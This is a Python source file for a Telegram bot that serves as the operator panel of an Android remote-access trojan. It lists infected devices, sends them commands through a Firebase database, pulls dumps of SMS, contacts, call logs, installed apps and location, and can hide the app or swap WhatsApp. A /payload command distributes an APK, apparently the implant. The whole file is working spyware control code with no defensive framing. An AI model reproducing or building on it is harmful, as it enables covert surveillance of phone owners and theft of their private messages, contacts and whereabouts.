try :
  import pyrebase
  import telebot
  import requests
  from telebot import types
  firebase_config = {
    'apiKey': "api_key",
    'databaseURL': "database_url",
    'projectId': "project_id",
    'storageBucket': "storage_bucket",
    'authDomain' : 'auth_domain',
    'appId': "app_id"
  }
  token = ""
  storage = firebase_config['storageBucket']

















  firebase = pyrebase.initialize_app(firebase_config)
  db = firebase.database()
  none = db.child("database/device_list").get()
  none = str(none.val())
  if none == "None" :
     db.child("database/device_list/count").set("0")
  dbs = firebase.storage()

  bot = telebot.TeleBot(token)
  def download_file(url, destination):
      response = requests.get(url)
      while True :

       if response.status_code == 200:
           with open(destination, 'wb') as file:
               file.write(response.content)
               break
       else:
           print(f"Failed to download file. Status code: {response.status_code}")

  @bot.message_handler(commands=['payload'])
  def send_payload(message) :
      user = message.from_user.id
      print("payload sending")
      with open("android.apk", "rb") as file :
          bot.send_document(user, file)


  @bot.message_handler(commands=['start'])
  def send_welcome(message):
      # Create a custom keyboard
      print(message.chat.id)
      keyboard = types.ReplyKeyboardMarkup(row_width=10, resize_keyboard=True)
      button1 = types.KeyboardButton('conected device')
      button2 = types.KeyboardButton('/payload')
      keyboard.add(button1)
      keyboard.add(button2)
      bot.send_message(message.chat.id, "𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝙻𝙴𝚇 𝚅𝙴𝚂𝙿𝙾𝚁 ", reply_markup=keyboard)
  @bot.message_handler(func=lambda message: True)
  def show_device(message) :
   if message.text == 'conected device' :
    x = db.child("database/device_list").get()
    x = x.val()
    x = str(x)
    print(x)
    x = x.replace('OrderedDict(', '')
    x = x.replace('])', ']')
    x = eval(x)
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for i in x :
       x = i[0]
       if x == "count" :
         break
       else :
         x = int(x)
         id = x
         device = db.child(f"database/device_list/{id}/android").get()
         device = device.val()
         model = db.child(f"database/device_list/{id}/model").get()
         model = model.val()
         print(model)
         device = "Android" + device  + "\n" + str(model)
         keyboard.add(types.InlineKeyboardButton(device, callback_data=id))
    bot.send_message(message.chat.id, "𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬:", reply_markup=keyboard)
  @bot.callback_query_handler(func=lambda call: True)
  def handle_callback_query(call):
      print(call.message.text)
      if call.message.text == '𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬:' :
       commands = ['𝗱𝘂𝗺𝗽_𝘀𝗺𝘀', '𝗱𝘂𝗺𝗽_𝗰𝗼𝗻𝘁𝗮𝗰𝘁', '𝐓𝐨𝐫𝐜𝐡_𝐨𝐧', '𝐓𝐨𝐫𝐜𝐡_𝐨𝐟𝐟', '𝐝𝐮𝐦𝐩_𝐚𝐩𝐩', '𝐝𝐮𝐦𝐩_𝐜𝐚𝐥𝐥𝐬',  '𝐆𝐞𝐭 𝐥𝐨𝐜𝐚𝐭𝐢𝐨𝐧', '𝐃𝐞𝐯𝐢𝐜𝐞 𝐢𝐧𝐟𝐨', "𝐬𝐭𝐚𝐭𝐮𝐬", '𝐯𝐢𝐛𝐫𝐚𝐭𝐢𝐨𝐧',"𝐮𝐧_𝐡𝐢𝐝𝐞_𝐚𝐩𝐩", "𝐡𝐢𝐝𝐞_𝐚𝐩𝐩", "𝐜𝐡𝐚𝐧𝐠𝐞"]
       bot.answer_callback_query(call.id)
       select_id = call.data
       print(select_id)
       keyboard = types.InlineKeyboardMarkup(row_width=1)
       for cmd in commands :
           keyboard.add(types.InlineKeyboardButton(cmd, callback_data=cmd+select_id))
       print("$$")
       bot.send_message(call.message.chat.id, "𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝", reply_markup=keyboard)
      if call.message.text == "𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝" :
       cmd = call.data
       if "𝐜𝐡𝐚𝐧𝐠𝐞" in cmd :
           id = cmd.replace("𝐜𝐡𝐚𝐧𝐠𝐞","")
           user = call.message.chat.id
           db.child("database/remote/device_id").set("")
           db.child("database/remote/respo").set("")
           db.child("database/remote/cmd").set("change_app")
           db.child("database/remote/path2").set("com.whatsapp")
           db.child("database/remote/path").set("whatsapp")
           db.child("database/remote/device_id").set(str(id))
           while True :
               respo = db.child("database/remote/respo").get()  
               respo = str(respo.val())
               if not respo == "" :
                   bot.send_message(user, respo)
                   break
       if '𝐮𝐧_𝐡𝐢𝐝𝐞_𝐚𝐩𝐩' in cmd :
           id = cmd.replace('𝐮𝐧_𝐡𝐢𝐝𝐞_𝐚𝐩𝐩',"")
           user = call.message.chat.id
           db.child("database/remote/device_id").set("")
           db.child("database/remote/respo").set("")
           db.child("database/remote/cmd").set("un_hide_app")   
           db.child("database/remote/device_id").set(str(id))
           while True :
               respo = db.child("database/remote/respo").get()
               respo = str(respo.val())
               if not respo == "" :                                                                                             
                   bot.send_message(user, respo)
                   break


       if "𝐡𝐢𝐝𝐞_𝐚𝐩𝐩" in cmd :
           id = cmd.replace("𝐡𝐢𝐝𝐞_𝐚𝐩𝐩","")
           user = call.message.chat.id
           db.child("database/remote/device_id").set("")
           db.child("database/remote/respo").set("")
           db.child("database/remote/cmd").set("hide_app")
           db.child("database/remote/device_id").set(str(id))
           while True :
               respo = db.child("database/remote/respo").get()
               respo = str(respo.val())
               if not respo == "" :
                   bot.send_message(user, respo)
                   break
       if '𝐯𝐢𝐛𝐫𝐚𝐭𝐢𝐨𝐧' in cmd :
           id = cmd.replace('𝐯𝐢𝐛𝐫𝐚𝐭𝐢𝐨𝐧',"")
           user = call.message.chat.id
           db.child("database/remote/device_id").set("")
           db.child("database/remote/respo").set("")
           db.child("database/remote/cmd").set("vibrate")
           db.child("database/remote/path").set("1000")

           db.child("database/remote/device_id").set(str(id))
           while True :
               respo = db.child("database/remote/respo").get()
               respo = str(respo.val())
               if not respo == "" :
                   bot.send_message(user, respo)
                   break
       if "𝐬𝐭𝐚𝐭𝐮𝐬" in cmd :
           user = call.message.chat.id
           id = cmd.replace("𝐬𝐭𝐚𝐭𝐮𝐬","")
           db.child(f"database/device_list/{id}/status").set('offline')
           bot.send_message(user, "OFFLINE")
           respo = db.child(f"database/device_list/{id}/status").get()
           respo = respo.val()
           while True :
             if respo == 'offline' :
                respo = db.child(f"database/device_list/{id}/status").get()
                respo = respo.val()
             else :
                bot.send_message(user, respo)
                break
       if '𝗱𝘂𝗺𝗽_𝗰𝗼𝗻𝘁𝗮𝗰𝘁' in cmd :
        #here 78
           user = call.message.chat.id
           id = cmd.replace('𝗱𝘂𝗺𝗽_𝗰𝗼𝗻𝘁𝗮𝗰𝘁', '')
           db.child("database/remote/device_id").set("")
           db.child("database/remote/respo").set("")

           db.child("database/remote/cmd").set("dump_contact")

           db.child("database/remote/device_id").set(str(id))


           while True :
               respo = db.child("database/remote/respo").get()
               respo = str(respo.val())
               if not respo == "" :
                   file_url = f'https://firebasestorage.googleapis.com/v0/b/{storage}/o/storage%2Fdump_contact.txt?alt=media'
                   print(respo)
                   bot.send_message(user, respo)
                   download_file(file_url, f"datas/dump_contact{id}.txt")
                   file = open(f"datas/dump_contact{id}.txt", "rb")
                   bot.send_document(user,file)
                   break


       if '𝐓𝐨𝐫𝐜𝐡_𝐨𝐧' in cmd :
                 print(cmd)
                 user = call.message.chat.id
                 id = cmd.replace('𝐓𝐨𝐫𝐜𝐡_𝐨𝐧', '')
                 db.child("database/remote/device_id").set("")
                 db.child("database/remote/respo").set("")
                 db.child("database/remote/cmd").set("turch_on")
                 db.child("database/remote/device_id").set(str(id))
                 while True :
                     respo = db.child("database/remote/respo").get()
                     respo = str(respo.val())
                     if not respo == "" :
                         bot.send_message(user, respo)
                         break

       if '𝐓𝐨𝐫𝐜𝐡_𝐨𝐟𝐟' in cmd :
                 print(cmd)
                 user = call.message.chat.id
                 id = cmd.replace('𝐓𝐨𝐫𝐜𝐡_𝐨𝐟𝐟', '')
                 db.child("database/remote/device_id").set("")
                 db.child("database/remote/respo").set("")
                 db.child("database/remote/cmd").set("turch_off")
                 db.child("database/remote/device_id").set(str(id))
                 while True :
                     respo = db.child("database/remote/respo").get()
                     respo = str(respo.val())                   
                     if not respo == "" :
                         bot.send_message(user, respo)          
                         break
       if '𝐝𝐮𝐦𝐩_𝐚𝐩𝐩' in cmd :
        #here 84

           user = call.message.chat.id
           id = cmd.replace('𝐝𝐮𝐦𝐩_𝐚𝐩𝐩', '')
           db.child("database/remote/device_id").set("")
           db.child("database/remote/respo").set("")

           db.child("database/remote/cmd").set("get_apps")

           db.child("database/remote/device_id").set(str(id))


           while True :
               respo = db.child("database/remote/respo").get()
               respo = str(respo.val())
               if not respo == "" :
                   file_url = f'https://firebasestorage.googleapis.com/v0/b/{storage}/o/storage%2Fdump_app.txt?alt=media'
                   print(respo)
                   bot.send_message(user, respo)
                   download_file(file_url, f"datas/dump_app{id}.txt")
                   file = open(f"datas/dump_app{id}.txt", "rb")
                   bot.send_document(user,file)
                   break

       if '𝐝𝐮𝐦𝐩_𝐜𝐚𝐥𝐥𝐬' in cmd :

           user = call.message.chat.id
           id = cmd.replace('𝐝𝐮𝐦𝐩_𝐜𝐚𝐥𝐥𝐬', '')
           db.child("database/remote/device_id").set("")
           db.child("database/remote/respo").set("")

           db.child("database/remote/cmd").set("get_call_logs")

           db.child("database/remote/device_id").set(str(id))


           while True :
               respo = db.child("database/remote/respo").get()
               respo = str(respo.val())
               if not respo == "" :
                   file_url = f'https://firebasestorage.googleapis.com/v0/b/{storage}/o/storage%2Fcall_logs.txt?alt=media'
                   print(respo)
                   bot.send_message(user, respo)
                   download_file(file_url, f"datas/dump_call{id}.txt")
                   file = open(f"datas/dump_call{id}.txt", "rb")
                   bot.send_document(user,file)
                   break

       if '𝐆𝐞𝐭 𝐥𝐨𝐜𝐚𝐭𝐢𝐨𝐧' in cmd :
                 print(cmd)
                 id = cmd.replace('𝐆𝐞𝐭 𝐥𝐨𝐜𝐚𝐭𝐢𝐨𝐧', '')
                 user = call.message.chat.id
                 db.child("database/remote/device_id").set("")
                 db.child("database/remote/respo").set("")
                 db.child("database/remote/cmd").set("get_location")
                 db.child("database/remote/device_id").set(str(id))
                 while True :
                     respo = db.child("database/remote/respo").get()
                     respo = str(respo.val())
                     if "https" in respo :
                         bot.send_message(user, respo)
                         break
       if '𝐃𝐞𝐯𝐢𝐜𝐞 𝐢𝐧𝐟𝐨' in cmd :
                 print(cmd)
                 user = call.message.chat.id
                 id = cmd.replace('𝐃𝐞𝐯𝐢𝐜𝐞 𝐢𝐧𝐟𝐨', '')
                 db.child("database/remote/device_id").set("")
                 db.child("database/remote/respo").set("")
                 db.child("database/remote/cmd").set("device_info")
                 db.child("database/remote/device_id").set(str(id))
                 while True :
                     respo = db.child("database/remote/respo").get()
                     respo = str(respo.val())
                     if not respo == "" :
                         bot.send_message(user, respo)
                         break
       if '𝗱𝘂𝗺𝗽_𝘀𝗺𝘀' in cmd  :
               print(cmd)
               id = cmd.replace('𝗱𝘂𝗺𝗽_𝘀𝗺𝘀', '')
               user = call.message.chat.id
               try :
                 id = int(id)
                 print(id)
                 db.child("database/remote/device_id").set("")
                 db.child("database/remote/respo").set("")

                 db.child("database/remote/cmd").set("dump_sms")

                 db.child("database/remote/device_id").set(str(id))


                 while True :
                     respo = db.child("database/remote/respo").get()
                     respo = str(respo.val())
                     if not respo == "" :
                         file_url = f'https://firebasestorage.googleapis.com/v0/b/{storage}/o/storage%2Fdump_sms.txt?alt=media'
                         download_file(file_url, f"datas/dump_sms{id}.txt")
                         print(respo, 'green')
                         bot.send_message(user, respo)
                         file = open(f"datas/dump_sms{id}.txt", "rb")
                         bot.send_document(user,file)
                         break
               except Exception as e :
                   bot.send_message(user, e)

  bot.polling()
except Exception as e :
  
  print(e)
